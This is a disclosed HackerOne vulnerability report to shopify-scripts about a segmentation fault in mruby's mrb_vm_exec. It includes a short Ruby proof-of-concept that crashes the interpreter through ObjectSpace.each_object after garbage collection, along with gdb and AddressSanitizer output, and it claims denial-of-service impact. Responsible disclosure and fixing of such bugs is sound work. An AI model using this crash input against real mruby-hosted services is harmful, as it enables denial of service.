# SIGSEGV - mrb_vm_exec - line:1312

## Report Details
- **Report ID**: 203513
- **URL**: https://hackerone.com/reports/203513
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-02-05T01:04:15.548Z
- **Disclosed**: 2017-03-29T23:29:23.263Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as mrb_vm_exec.rb):

	n
	s
	s
	k
	(h)
	GC.start
	ObjectSpace.each_object{|obj|obj[]}
	
Debug - mirb
-------------------

	(gdb) r mrb_vm_exec.rb 
	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /home/x/Desktop/research/test/mruby/bin/mirb mrb_vm_exec.rb
	mirb - Embeddable Interactive Ruby Shell

	(mirb):1: undefined method 'n' for main (NoMethodError)
	(mirb):2: undefined method 's' for main (NoMethodError)
	(mirb):3: undefined method 's' for main (NoMethodError)
	(mirb):4: undefined method 'k' for main (NoMethodError)
	(mirb):5: undefined method 'h' for main (NoMethodError)
	 => nil

	Program received signal SIGSEGV, Segmentation fault.
	0x000000000040a4ad in mrb_vm_exec (mrb=0x6ae010, proc=0x704570, pc=0x6ad540 <call_iseq>) at /home/x/Desktop/research/test/mruby/src/vm.c:1312
	1312	        regs[0] = m->env->stack[0];
	(gdb) info reg
	rax            0x0	0
	rbx            0x6c0e70	7081584
	rcx            0x6c0e80	7081600
	rdx            0xffffffffffffffff	-1
	rsi            0x1	1
	rdi            0x6c0ea0	7081632
	rbp            0x7fffffffc220	0x7fffffffc220
	rsp            0x7fffffffbc90	0x7fffffffbc90
	r8             0x3	3
	r9             0x6ba4b0	7054512
	r10            0xd	13
	r11            0x7ffff7895700	140737346361088
	r12            0x401ca0	4201632
	r13            0x7fffffffe050	140737488347216
	r14            0x0	0
	r15            0x0	0
	rip            0x40a4ad	0x40a4ad <mrb_vm_exec+8618>
	eflags         0x10246	[ PF ZF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0


Backtrace
-------------------

	(gdb) bt
	#0  0x000000000040a4ad in mrb_vm_exec (mrb=0x6ae010, proc=0x704570, pc=0x6ad540 <call_iseq>) at /home/x/Desktop/research/test/mruby/src/vm.c:1312
	#1  0x0000000000408301 in mrb_vm_run (mrb=0x6ae010, proc=0x6b5da0, self=..., stack_keep=3) at /home/x/Desktop/research/test/mruby/src/vm.c:801
	#2  0x0000000000410312 in mrb_run (mrb=0x6ae010, proc=0x6b5da0, self=...) at /home/x/Desktop/research/test/mruby/src/vm.c:2522
	#3  0x0000000000407ead in mrb_yield_with_class (mrb=0x6ae010, b=..., argc=1, argv=0x7fffffffc340, self=..., c=0x6ba4b0) at /home/x/Desktop/research/test/mruby/src/vm.c:682
	#4  0x0000000000407fe9 in mrb_yield (mrb=0x6ae010, b=..., arg=...) at /home/x/Desktop/research/test/mruby/src/vm.c:702
	#5  0x0000000000468b18 in os_each_object_cb (mrb=0x6ae010, obj=0x704570, ud=0x7fffffffc490) at /home/x/Desktop/research/test/mruby/mrbgems/mruby-objectspace/src/mruby_objectspace.c:139
	#6  0x000000000043439c in gc_each_objects (mrb=0x6ae010, gc=0x6ae0e8, callback=0x468a40 <os_each_object_cb>, data=0x7fffffffc490) at /home/x/Desktop/research/test/mruby/src/gc.c:1486
	#7  0x00000000004343f3 in mrb_objspace_each_objects (mrb=0x6ae010, callback=0x468a40 <os_each_object_cb>, data=0x7fffffffc490) at /home/x/Desktop/research/test/mruby/src/gc.c:1496
	#8  0x0000000000468bec in os_each_object (mrb=0x6ae010, self=...) at /home/x/Desktop/research/test/mruby/mrbgems/mruby-objectspace/src/mruby_objectspace.c:170
	#9  0x0000000000409e4b in mrb_vm_exec (mrb=0x6ae010, proc=0x6b60d0, pc=0x716198) at /home/x/Desktop/research/test/mruby/src/vm.c:1211
	#10 0x0000000000408301 in mrb_vm_run (mrb=0x6ae010, proc=0x6b60d0, self=..., stack_keep=1) at /home/x/Desktop/research/test/mruby/src/vm.c:801
	#11 0x0000000000402b90 in main (argc=2, argv=0x7fffffffe058) at /home/x/Desktop/research/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Clang - mirb
-------------------

	x@x:~/Desktop/research/test/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ./mirb mrb_vm_exec.rb 
	mirb - Embeddable Interactive Ruby Shell

	(mirb):1: undefined method 'n' for main (NoMethodError)
	(mirb):2: undefined method 's' for main (NoMethodError)
	(mirb):3: undefined method 's' for main (NoMethodError)
	(mirb):4: undefined method 'k' for main (NoMethodError)
	(mirb):5: undefined method 'h' for main (NoMethodError)
	 => nil
	ASAN:DEADLYSIGNAL
	=================================================================
	==8045==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x0000004fb929 bp 0x7fffda858cc0 sp 0x7fffda858000 T0)
		#0 0x4fb928 in mrb_vm_exec /home/x/Desktop/research/test/clang/mruby/src/vm.c:1312:22
		#1 0x4f984e in mrb_vm_run /home/x/Desktop/research/test/clang/mruby/src/vm.c:801:10
		#2 0x4f8b73 in mrb_run /home/x/Desktop/research/test/clang/mruby/src/vm.c:2522:12
		#3 0x4f967c in mrb_yield_with_class /home/x/Desktop/research/test/clang/mruby/src/vm.c:682:11
		#4 0x4f97b0 in mrb_yield /home/x/Desktop/research/test/clang/mruby/src/vm.c:702:10
		#5 0x569544 in os_each_object_cb /home/x/Desktop/research/test/clang/mruby/mrbgems/mruby-objectspace/src/mruby_objectspace.c:139:3
		#6 0x52dcba in gc_each_objects /home/x/Desktop/research/test/clang/mruby/src/gc.c:1486:7
		#7 0x52dc3a in mrb_objspace_each_objects /home/x/Desktop/research/test/clang/mruby/src/gc.c:1496:3
		#8 0x5692f0 in os_each_object /home/x/Desktop/research/test/clang/mruby/mrbgems/mruby-objectspace/src/mruby_objectspace.c:170:3
		#9 0x4fb2d5 in mrb_vm_exec /home/x/Desktop/research/test/clang/mruby/src/vm.c:1211:18
		#10 0x4f984e in mrb_vm_run /home/x/Desktop/research/test/clang/mruby/src/vm.c:801:10
		#11 0x4f3010 in main /home/x/Desktop/research/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18
		#12 0x7faccff6dec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#13 0x41a575 in _start (/home/x/Desktop/research/test/clang/mruby/bin/mirb+0x41a575)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/test/clang/mruby/src/vm.c:1312:22 in mrb_vm_exec
	==8045==ABORTING

Impact
--------------------

It can cause DoS.

## Attachments
- mrb_vm_exec.rb
